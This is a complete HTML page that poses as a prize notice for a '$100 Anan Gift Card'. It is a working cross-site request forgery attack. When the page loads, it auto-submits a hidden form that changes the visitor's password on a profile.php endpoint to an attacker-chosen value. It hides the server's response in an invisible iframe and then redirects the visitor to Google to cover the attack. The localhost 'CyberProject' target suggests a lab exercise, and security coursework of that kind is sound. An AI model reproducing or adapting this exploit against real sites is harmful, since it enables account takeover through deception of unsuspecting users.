<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎁 Your $100 Anan Gift Card</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            text-align: center;
            padding: 20px;
            overflow: hidden;
        }
        .card {
            background: rgba(255, 255, 255, 0.14);
            backdrop-filter: blur(14px);
            -webkit-backdrop-filter: blur(14px);
            border: 1px solid rgba(255, 255, 255, 0.28);
            border-radius: 24px;
            padding: 50px 40px;
            max-width: 460px;
            width: 100%;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.35);
            animation: pop .6s ease-out;
        }
        @keyframes pop {
            from { transform: scale(.85); opacity: 0; }
            to   { transform: scale(1);   opacity: 1; }
        }
        .emoji { font-size: 78px; margin-bottom: 8px; animation: bounce 1.5s infinite; }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50%      { transform: translateY(-12px); }
        }
        h1 { font-size: 30px; margin: 0 0 12px; font-weight: 800; letter-spacing: -0.5px; }
        p  { font-size: 16px; opacity: .94; line-height: 1.5; margin: 0 0 26px; }
        .spinner {
            width: 44px;
            height: 44px;
            border: 4px solid rgba(255, 255, 255, 0.25);
            border-top-color: #fff;
            border-radius: 50%;
            margin: 0 auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .small { display: block; margin-top: 22px; font-size: 13px; opacity: .8; }
    </style>
</head>
<body onload="launchAttack()">
    <div class="card">
        <div class="emoji">🎁</div>
        <h1>You won a $100 Gift Card!</h1>
        <p>Verifying your Anan Super Market account...<br>Please wait while we credit your wallet.</p>
        <div class="spinner"></div>
        <span class="small">Do not close this page.</span>
    </div>

    <!-- hidden iframe for response to avoid alerting the user -->
    <iframe name="csrf_sink" style="display:none !important;"></iframe>

    <form id="pwn"
          action="http://localhost/CyberProject/profile.php"
          method="POST"
          target="csrf_sink">
        <input type="hidden" name="new_password" value="pwned_by_attacker_123">
    </form>

    <script>
        function launchAttack() {
            document.getElementById("pwn").submit();
            // Send the victim somewhere boring so the broken page disappears.
            setTimeout(function () {
                window.location.href = "https://www.google.com";
            }, 2000);
        }
    </script>
</body>
</html>
